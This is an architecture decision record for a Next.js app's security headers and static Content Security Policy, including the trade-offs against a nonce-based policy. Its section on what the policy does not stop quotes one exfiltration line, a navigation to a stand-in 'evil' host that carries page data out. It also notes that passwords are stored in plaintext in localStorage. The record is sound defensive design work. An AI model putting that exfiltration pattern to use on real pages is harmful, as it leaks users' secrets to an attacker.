# 0005 — Web security headers and CSP

- **Status:** Accepted (2026-11-15, recommendation adopted by the maintainer's delegation)
- **Date:** 2026-11-15
- **Issue:** seedora-transmission-c07.7

## Context

The web app sends no CSP, HSTS, `X-Frame-Options`, `Referrer-Policy` or similar headers. Facts that constrain the answer:

- **One route, client-only.** `page.tsx` renders `SeedoraApp` with `dynamic(..., { ssr: false })`. The HTML shell is static and prerenderable. There is no middleware or proxy today.
- **Next 16 App Router injects inline `<script>` tags** (the RSC payload, `self.__next_f.push(...)`). A strict script policy therefore needs either per-request nonces or `'unsafe-inline'`. In Next 16, the nonce path goes through a `proxy.ts` file (the renamed middleware; the `proxy` filename constant was checked in `next@16.1.6`) that sets a CSP header containing a nonce, and it forces **dynamic rendering** of the page.
- **PWA.** `@ducanh2912/next-pwa` registers a same-origin service worker that precaches the shell.
- **Same-origin only.** There are no third-party scripts, fonts or analytics. Fonts and styles are compiled by Tailwind into same-origin CSS. The browser only talks to its own origin, through server actions. GeoIP is a server-side lookup.
- **Future domains.** The landing page moves to `seedora.app` and the app to `app.seedora.app` (epic 52c). Headers set by the app must not constrain the landing page, and vice versa.
- **XSS surface today.** Daemon strings are rendered as React text; there is no `dangerouslySetInnerHTML`, `eval` or `new Function` (`docs/security.md`).

## Decision

Headers are set in `apps/web/next.config.ts` with `async headers()` on `source: '/:path*'`, built by a small pure function in a separate module (`apps/web/src/lib/security-headers.ts`) so it can be unit-tested and so `next.config.ts` keeps a single owner.

| Header | Value |
|---|---|
| `Content-Security-Policy` | see below |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` — production only; no `preload` (see Consequences) |
| `X-Frame-Options` | `DENY` (legacy companion to `frame-ancestors`) |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `no-referrer` |
| `Cross-Origin-Opener-Policy` | `same-origin` |
| `Cross-Origin-Resource-Policy` | `same-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=(), browsing-topics=()` (notifications are not restricted, since the app uses them) |

**CSP (production):**

```
default-src 'self';
script-src 'self' 'unsafe-inline';
script-src-attr 'none';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self' data:;
connect-src 'self';
worker-src 'self';
manifest-src 'self';
object-src 'none';
base-uri 'none';
form-action 'self';
frame-ancestors 'none'
```

**Development** adds `'unsafe-eval'` to `script-src` and `ws:` to `connect-src` (React dev tooling and Turbopack HMR), and drops HSTS. Vercel **preview** deployments (`VERCEL_ENV=preview`) add `https://vercel.live` to `script-src`, `connect-src`, `img-src`, `style-src`, `font-src` and `frame-src` for the Vercel toolbar. Production does not.

This is a **static policy**. `'unsafe-inline'` in `script-src` is the deliberate trade-off that keeps the page static, cacheable and compatible with the service worker's precache. `script-src-attr 'none'` keeps inline event-handler attributes (`onclick=...`) blocked even though inline `<script>` is allowed: the app uses none, and injected markup is the commonest XSS shape. The other directives — no framing, no `<base>` hijack, no plugins, same-origin `connect-src` — still apply, and React text rendering remains the primary XSS defence.

**What the CSP does not stop.** `connect-src 'self'` blocks exfiltration by `fetch`/XHR/WebSocket only. It does **not** stop exfiltration by top-level navigation (`location = 'https://evil/?' + data`): `navigate-to` was never shipped, and `Referrer-Policy: no-referrer` only hides the referrer. Today the web client keeps daemon passwords in `localStorage` in plaintext, so any script that runs on the origin can read and leak them. The CSP is therefore defence in depth; the real controls are no injection sinks and, tracked separately, not storing the password client-side (see `docs/security.md`).

## Open question

Should the app ship a static CSP (above) now, or a nonce-based strict CSP through `proxy.ts`?

**Recommendation:** ship the static policy for the P0, and file a follow-up to evaluate a nonce CSP (`'nonce-…' 'strict-dynamic'`) in `Content-Security-Policy-Report-Only` first. A nonce CSP costs:

- one function invocation per page load;
- the loss of static prerendering;
- a stale-nonce interaction with the service worker's cached shell, which must be tested;
- the first middleware/proxy in an app documented as having none.

That cost should be weighed with evidence, not under P0 pressure.

## Alternatives considered

- **Nonce CSP via `proxy.ts` now**: the strongest script policy, with the costs listed above. Deferred, not rejected.
- **Hash-based CSP**: Next's inline RSC payload scripts change with content, so hashes cannot be precomputed for them.
- **Headers in `vercel.json`**: Vercel-only. Self-hosted `next start` would ship no headers. `next.config.ts` covers both.
- **`helmet` or a similar dependency**: written for Express middleware; the eight static headers above do not justify a dependency.

## Consequences

- Every response carries the headers, in production and self-hosted alike. A self-hoster serving plain HTTP gets no HSTS, because browsers ignore HSTS over HTTP. `upgrade-insecure-requests` is deliberately omitted: every subresource is same-origin, so it adds nothing over HTTPS, and it would break a plain-HTTP self-hosted instance by upgrading same-origin requests.
- `includeSubDomains` on `app.seedora.app` covers only its own subdomains. HSTS for the apex `seedora.app`, and any `preload` submission, are decisions for the landing page (epic 52c), not for the app.
- Any future third-party origin, such as an error reporter or CDN, needs a CSP change reviewed by `security-auditor`.
- The PWA install and offline shell, notifications and HMR in development must be verified in the running app after the change (`verify-ui` skill), with the browser console checked for CSP violations.
